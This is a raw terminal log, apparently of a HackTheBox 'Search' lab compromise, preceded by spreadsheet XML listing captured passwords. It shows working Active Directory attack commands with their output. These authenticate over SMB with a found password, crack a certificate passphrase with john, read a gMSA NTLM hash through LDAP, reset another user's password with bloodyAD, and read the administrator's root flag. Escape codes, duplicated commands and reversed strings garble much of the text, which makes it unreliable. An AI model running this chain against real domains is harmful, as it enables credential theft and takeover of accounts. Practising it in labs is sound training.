+  </si>
+  <si>
+    <t>Sutton</t>
+  </si>
+  <si>
+    <t>Sierra</t>
+  </si>
+  <si>
+    <t>Frye</t>
+  </si>
+  <si>
+    <t>Username</t>
+  </si>
+  <si>
+    <t>Date</t>
+  </si>
+  <si>
+    <t>Captured Passwords</t>
+  </si>
+  <si>
+    <t>IT ChangeOver Keely Lyons Started</t>
+  </si>
+  <si>
+    <t>//51+mountain+DEAR+noise+83//</t>
+  </si>
+  <si>
+    <t>++47|building|WARSAW|gave|60++</t>
+  </si>
+  <si>
+    <t>!!05_goes_SEVEN_offer_83!!</t>
+  </si>
+  <si>
+    <t>~~27%when%VILLAGE%full%00~~</t>
+  </si>
+  <si>
+    <t>==95~pass~QUIET~austria~77==</t>
+  </si>
+  <si>
+    <t>//61!banker!FANCY!measure!25//</t>
+  </si>
+  <si>
+    <t>??40:student:MAYOR:been:66??</t>
+  </si>
+  <si>
+    <t>&amp;&amp;75:major:RADIO:state:93&amp;&amp;</t>
+  </si>
+  <si>
+    <t>**30*venus*BALL*office*42**</t>
+  </si>
+  <si>
+    <t>;;36!cried!INDIA!year!50;;</t>
+  </si>
+  <si>
+    <t>..10-time-TALK-proud-66..</t>
+  </si>
+  <si>
+    <t>??47^before^WORLD^surprise^91??</t>
+  </si>
+  <si>
+ 
+$ [21:11:51] boxset Username4 sierra.frye
+boxset Password4 '$$49=wide=STRAIGHT=jordan=28$$18'
+
+$ [21:12:06] netexec smb $BoxIP -u $Username4 -p $Password4
+
+$ [21:12:25] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "get \"sierra.frye/Desktop/user.txt\" $BoxDir/loot/user.txt" && cat $BoxDir/loot/user.txt
+   <t>**24&amp;moment&amp;BRAZIL&amp;members&amp;66**</t>
+  </si>
+  <si>
+    <t>$$49=wide=STRAIGHT=jordan=28$$18</t>
+  </si>
+</sst>
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:10:25] $ =boxset Username4 sierra.frye
+boxset Password4 '$$49=wide=STRAIGHT=jordan=28$$18'boxsetboxset'$$49=wide=STRAIGHT=jordan=28$$18'>
+]133;C\[+] Username4=sierra.frye (saved to .env)
+[+] Password4=$$49=wide=STRAIGHT=jordan=28$$18 (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:11:51] $ =netexec smb $BoxIP -u $Username4 -p $Password4netexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:12:07] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "get \"sierra.frye/Desktop/user.txt\" $BoxDir/loot/user.txt" && cat $BoxDir/loot/user.txtsmbclient"get \"sierra.frye/Desktop/user.txt\" $BoxDir/loot/user.txt"cat>
+]133;C\getting file \sierra.frye\Desktop\user.txt of size 34 as /home/kali/Platforms/HackTheBox/Search/loot/user.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+2efa1fee36aabd7ab949a73e11462d03
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:12:26] $ =llloloootloott t flag user kali@kali:~/Platforms/HackTheBox/Search [21:12:07] $ smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "get \"sierra.frye/Desktop/user.txt\" $BoxDir/loot/user.txt" && cat $BoxDir/loot/user.txt
+getting file \sierra.frye\Desktop\user.txt of size 34 as /home/kali/Platforms/HackTheBox/Search/loot/user.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+2efa1fee36aabd7ab949a73e11462d03
+kali@kali:~/Platforms/HackTheBox/Search [21:12:26] $
+
+"get \"sierra.frye/Desktop/user.txt\" $BoxDir/loot/user.txt"catgetting/home/kali/Platforms/HackTheBox/Search/loot/user.txt2efa1fee36aabd7ab949a73e11462d03kali@kali:~/Platforms/HackTheBox/Search           c r a e S / x o B e h T k c a H / s m r o f t a l P / ~ : i l a k @ i l ka k 0 d 2 6 4 1 1 e 3 7 a 9 4 9 b a 7 d b a a 6 3 e e f 1 a f 2e 2                                   o       x t .[2
+$ [21:13:33] loot flag user 2efa1fee36aabd7ab949a73e11462d03
+
+$ [21:14:07] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "ls sierra.frye/Downloads/"
+4m r e s u / t o o l / h c r a e S / x o B e h T k c a H / s m r o f t a l P / i l a k / e m o h /         s                              \s\ \     n i t t ge g                      a cac    t x t . r e s u / t o o l /  i xD x o B$ $   \ t x t . r e s u / p o t k s e D / e y r f . a r r e i s  \   t e g "                                                            ///          s                                                   2efa1fee36aabd7ab949a73e11462d03>]133;C\[+] Flag saved:  user = 2efa1fee36aabd7ab949a73e11462d03  →  loot/flags.txt
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:13:33] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "ls sierra.frye/Downloads/"smbclient"ls sierra.frye/Downloads/">
+]133;C\  .                                 DRc        0  Fri Jul 31 15:45:36 
+$ [21:14:23] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "ls sierra.frye/Downloads/Backups/"
+
+$ [21:15:21] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "get \"sierra.frye/Downloads/Backups/staff.pfx\" $BoxDir/loot/staff.pfx; get \"sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12\" $BoxDir/loot/search-RESEARCH-CA.p12"
+2020
+  ..                                DRc        0  Fri Jul 31 15:45:36 2020
+  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 19:04:01 2020
+  Backups                           DHc        0  Mon Aug 10 21:39:17 2020
+  desktop.ini                      AHSc      282  Fri Jul 31 15:42:18 2020
+
+		3246079 blocks of size 4096. 764481 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:14:08] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "ls sierra.frye/Downloads/Backups/"smbclient"ls sierra.frye/Downloads/Backups/">
+]133;C\  .                                 DHc        0  Mon Aug 10 21:39:17 2020
+  ..                                DHc        0  Mon Aug 10 21:39:17 2020
+  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 16:04:11 2020
+  staff.pfx                          Ac     4326  Mon Aug 10 21:39:17 2020
+
+		3246079 blocks of size 4096. 764463 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:14:24] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username4%$Password4 -c "get \"sierra.frye/Downloads/Backups/staff.pfx\" $BoxDir/loot/staff.pfx; get \"sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12\" $BoxDir/loot/search-RESEARCH-CA.p12"smbclient"get \"sierra.frye/Downloads/Backups/staff.pfx\" $BoxDir/loot/staff.pfx; get \"sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12\" $BoxDir/loot/search-RESEARCH-CA.p12">
+]133;C\getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as /home/kali/Platforms/HackTheBox/Search/loot/staff.pfx (66.0 KiloBytes/sec) (average 66.0 KiloBytes/sec)
+getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as /home/kali/Platforms/HackTheBox/Search/loot/search-RESEARCH-CA.p12 (41.0 KiloBytes/sec) (average 53.6 KiloBytes/sec)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:15:21] $ =openssl pkcs12 -in $BoxDir/loot/staff.pfx -nokeys -clcert
+$ [21:15:36] openssl pkcs12 -in $BoxDir/loot/staff.pfx -nokeys -clcerts -passin pass: 2>/dev/null | openssl x509 -noout -subject -issuer
+
+$ [21:15:51] pfx2john $BoxDir/loot/staff.pfx > $BoxDir/loot/staff.pfx.hash && john $BoxDir/loot/staff.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+$ [21:16:05] john $BoxDir/loot/staff.pfx.hash --show
+
+$ [21:16:21] boxset PfxPass misspissy
+
+$ [21:17:02] 
+openssl pkcs12 -in $BoxDir/loot/staff.pfx -nokeys -clcerts -passin pass:$PfxPass 2>/dev/null | openssl x509 -noout -subject -issuer
+
+$ [21:17:53] curl -sk https://$BoxIP/staff -E $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"
+s -passin pass: 2>/dev/null | openssl x509 -noout -subject -issueropenssl2>/dev/nullopenssl>
+]133;C\Could not find certificate from <stdin>
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:15:36] $ =pfx2john $BoxDir/loot/staff.pfx > $BoxDir/loot/staff.pfx.hash && john $BoxDir/loot/staff.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txtpfx2john>john>
+]133;C\Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+No password hashes left to crack (see FAQ)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:15:51] $ =john $BoxDir/loot/staff.pfx.hash --showjohn>
+]133;C\staff.pfx:misspissy:::::/home/kali/Platforms/HackTheBox/Search/loot/staff.pfx
+
+1 password hash cracked, 0 left
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:16:05] $ =boxset PfxPass misspissyboxset>
+]133;C\[+] PfxPass=misspissy (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:16:21] $ =
+openssl pkcs12 -in $BoxDir/loot/staff.pfx -nokeys -clcerts -passin pass:$PfxPass 2>/dev/null | openssl x509 -noout -subject -issueropenssl2>/dev/nullopenssl>
+]133;C\subject=DC=htb, DC=search, OU=Sites, OU=Birmingham, OU=Users, CN=Sierra Frye
+issuer=DC=htb, DC=search, CN=search-RESEARCH-CA
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:17:02] $ =curl -sk https://$BoxIP/staff -E $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"curl/dev/null"%{http_code}\n">
+]133;C\000
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search[
+$ [21:18:08] curl -sk https://$Domain/staff -E $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"
+
+$ [21:18:23] echo "$BoxIP research.search.htb" | sudo tee -a /etc/hosts
+curl -sk https://research.search.htb/staff -E $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"
+
+$ [21:18:49] curl -v https://$Domain/staff -E $BoxDir/loot/staff.pfx:$PfxPass 2>&1 | head -30
+
+$ [21:19:06] curl -v https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -k 2>&1 | head -30
+39m [21:17:53] $ =curl -sk https://$Domain/staff -E $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"curl/dev/null"%{http_code}\n">
+]133;C\000
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:18:08] $ =echo "$BoxIP research.search.htb" | sudo tee -a /etc/hosts
+curl -sk https://research.search.htb/staff -E $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"echo "$BoxIP research.search.htb"sudo tee/etc/hostscurl/dev/null"%{http_code}\n">
+]133;C\[sudo] password for kali: 
+10.129.229.57 research.search.htb
+000
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:18:26] $ =curl -v https://$Domain/staff -E $BoxDir/loot/staff.pfx:$PfxPass 2>&1 | head -30curl2>&head>
+]133;C\* Host search.htb:443 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.57
+*   Trying 10.129.229.57:443...
+* could not load PEM client certificate from /home/kali/Platforms/HackTheBox/Search/loot/staff.pfx, OpenSSL error error:0480006C:PEM routines::no start line, (no key found, wrong passphrase, or wrong file format?)
+* closing connection #0
+curl: (58) could not load PEM client certificate from /home/kali/Platforms/HackTheBox/Search/loot/staff.pfx, OpenSSL error error:0480006C:PEM routines::no start line, (no key found, wrong passphrase, or wrong file format?)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:18:49] $ =curl -v https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -k 2>&1 | head -30curl2>&head>
+]133;C\* Host search.htb:443 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.57
+*   Trying 10.129.229.57:443...
+* ALPN: curl offers h2,http/1.1
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [1689 bytes data]
+* SSL Trust: peer verification disabled
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [94 bytes data]
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+{ [1397 bytes data]
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+{ [365 bytes data]
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+{ [4 bytes data]
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+} [102 bytes data]
+* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.2 (OUT), TLS handshake, Finish
+$ [21:19:22] curl -sk https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"
+
+$ [21:19:36] curl -skL https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"
+
+$ [21:19:54] curl -skL https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -D - 2>/dev/null | grep -E "^Location:|<title>"
+ed (20):
+} [16 bytes data]
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+{ [16 bytes data]
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp384r1 / rsaEncryption
+* ALPN: server accepted h2
+* Server certificate:
+*   subject: CN=research.search.htb; CN=research
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:19:07] $ =curl -sk https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"curl/dev/null"%{http_code}\n">
+]133;C\301
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:19:23] $ =curl -skL https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -o /dev/null -w "%{http_code}\n"curl/dev/null"%{http_code}\n">
+]133;C\302
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:19:38] $ =curl -skL https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -D - 2>/dev/null | grep -E "^Location:|<title>"curl2>/dev/nullgrep"^Location:|<title>">
+]133;C\Location: https://search.htb/staff/
+Location: /staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/
+$ [21:20:18] curl -skL https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -c $BoxDir/loot/cookies.txt -b $BoxDir/loot/cookies.txt -o $BoxDir/loot/staff-logon.html -w "%{http_code}\n"
+
+$ [21:20:33] grep -i "title\|form\|input\|action" $BoxDir/loot/staff-logon.html | head -20
+logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+Location: https://search.htb/staff/en-US/logon.aspx
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:19:56] $ =curl -skL https://$Domain/staff --cert-type P12 --cert $BoxDir/loot/staff.pfx:$PfxPass -c $BoxDir/loot/cookies.txt -b $BoxDir/loot/cookies.txt -o $BoxDir/loot/staff-logon.html -w "%{http_code}\n"curl"%{http_code}\n">
+]133;C\200
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:20:18] $ =grep -i "title\|form\|input\|action" $BoxDir/loot/staff-logon.html | head -20grep"title\|form\|input\|action"head>
+]133;C\    <title></title>  
+<body class="form-layout login" onload="bootstrap();">
+    <form method="post" action="./logon.aspx" id="logOnForm" autocomplete="off">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE0NzgxMTkyOTcPZBYCZg9kFgICAQ9kFgQCAQ8WAh4HVmlzaWJsZWhkAgUPZBYEAgEPFgIfAGgWBAIFDw8WAh4EVGV4dAUGRGVsZXRlZGQCBw8PFgIfAQULTmV3IFNlc3Npb25kZAICD2QWAgIDD2QWAgIdDw8WAh8BBQdTaWduIEluZGRklIbBXbzISo7RTWZJ8W+HqxRZLTvkXMug33te/A9QTCs=" />
+<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="E1F0638E" />
+<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdABDsi/bDil/MHy71tIprSz/dOGmAeYnrCn7l4HKpS0S3PrgsETBjMT6GhrSrOTblFa4oEZV+mS7OYlgMO/YC4GlLi0gJ8YEbHiccZGZU3FMKqQODz+nnTbMB0U+snJoa/VGSAmrkIv6M8J3P/CQJfUz5/QiZFa1+i9bo6WF9GgmOpfdYcS7dPEFdYM27aKu8bC6Jj2NY3SOcTG6NWDdH8E/TObX7eikOGF9Lcjcxb0yJrQ3fDD0NdUwYheZCbQiee7KuocNWmjMwttcI4ErUCx7iG0NcpRoJPZDUdkzXi9kBovUSO9m0FmharJXDgO6iY3GP/ypXhvJY6eYlu/Rsa9C9CV4sbejO1UXdCmoHuT3uOwmc+GUC8zVKK/bZW2qXI3g=" />
+                    <input name="ctl00$MainContent$userNameTextBox" type="text" id="userNameTextBox" class="required" />
+                    <input name="ctl00$MainContent$passwordTextBox" type="password" id="passwordTextBox" class="required" />
+                    <input name="ctl00$MainContent$targetNodeTextBox" type="text" id="targetNodeTextBox" class="required" />
+                    <input name="ctl00$MainContent$connect
+$ [21:22:52] firefox https://$Domain/staff &
+
+$ [21:32:46] netexec ldap $BoxIP -u $Username4 -p $Password4 --gmsa
+
+$ [21:33:42] boxset GmsaHash e1e9fd9e46d0d747e1595167eedcec0f
+ionUriTextBox" type="text" id="connectionUriTextBox" class="required" />
+                            <input name="ctl00$MainContent$altUserNameTextBox" type="text" id="altUserNameTextBox" class="required" />
+                            <input name="ctl00$MainContent$altPasswordTextBox" type="password" id="altPasswordTextBox" class="required" />
+                        <input name="ctl00$MainContent$configurationNameTextBox" type="text" id="configurationNameTextBox" class="required" />
+                        <input name="ctl00$MainContent$portTextBox" type="text" id="portTextBox" class="required default" />
+                        <input name="ctl00$MainContent$applicationNameTextBox" type="text" id="applicationNameTextBox" class="required default" />
+                    <input name="ctl00$MainContent$advancedPanelShowLabel" type="text" id="advancedPanelShowLabel" style="display: none" class="required" value="10" />
+                    <input type="submit" name="ctl00$MainContent$ButtonLogOn" value="Sign In" id="ButtonLogOn" class="button" name="sign-in" />
+            <h2 id="warningTitle" class="messageboxHeader">Warning</h2>
+                <p class="actions">
+                    <input id="timeoutAliveButton" type="button" value="Yes" class="keep-alive" />
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:20:33] $ =firefox https://$Domain/staff &firefox>
+]133;C\[1] 346798
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:22:52] $ =
+[1]  + done       firefox https://$Domain/staff
+]133;C\LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18 
+LDAP        10.129.229.57   389    RESEARCH         [*] Getting GMSA Passwords
+LDAP        10.129.229.57   389    RESEARCH         Account: BIR-ADFS-GMSA$       NTLM: e1e9fd9e46d0d747e1595167eedcec0f     PrincipalsAllowedToReadPassword: ITSec
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:32:47] $ =boxset GmsaHash e1e9fd9e46d0d747e1595167eedcec0fboxset>
+]133;C\[+] GmsaHash=e1e9fd9e46d0d747e1595167eedcec0f (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:33:42] $ =netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHashnete[
+$ [21:33:57] netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
+
+$ [21:34:14] bloodyAD -d $Domain -u 'BIR-ADFS-GMSA$' -p :$GmsaHash --host $BoxIP set password Tristan.Davies 'Passw0rd123!'
+
+$ [21:34:30] netexec smb $BoxIP -u Tristan.Davies -p 'Passw0rd123!'
+32mxec'BIR-ADFS-GMSA$'>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\BIR-ADFS-GMSA$:e1e9fd9e46d0d747e1595167eedcec0f 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:33:58] $ =bloodyAD -d $Domain -u 'BIR-ADFS-GMSA$' -p :$GmsaHash --host $BoxIP set password Tristan.Davies 'Passw0rd123!'bloodyAD'BIR-ADFS-GMSA$''Passw0rd123!'>
+]133;C\[+] Password changed successfully!
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:34:14] $ =netexec smb $BoxIP -u Tristan.Davies -p 'Passw0rd123!'netexec'Passw0rd123!'>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Tristan.Davies:Passw0rd123! (Pwn3d!)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:34:31] $ =netexec smb $BoxIP -u Tristan.Davies -p 'Passw0rd123!' -x 'type C:\Users\Administrator\Desktop\netexec'Passw0rd123!''type C:\Users\Administrator\Desktop\>
+quote> =
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:35:37] $ =netexec smb $BoxIP -u Tristan.Davies -p 'Passw0rd123!' -x 'type C:\Users\Administrator\Desktop\netexec'Passw0rd123!''type C:\Users\Administrator\Desktop\p \[
+$ [21:35:48] netexec smb $BoxIP -u Tristan.Davies -p 'Passw0rd123!' -x 'type C:\Users\Administrator\Desktop\root.txt'
+
+$ [21:36:59] loot flag root fad84f82a730bbe50fda5344ff9e2bf3
+
+$ [21:37:07] boxdone
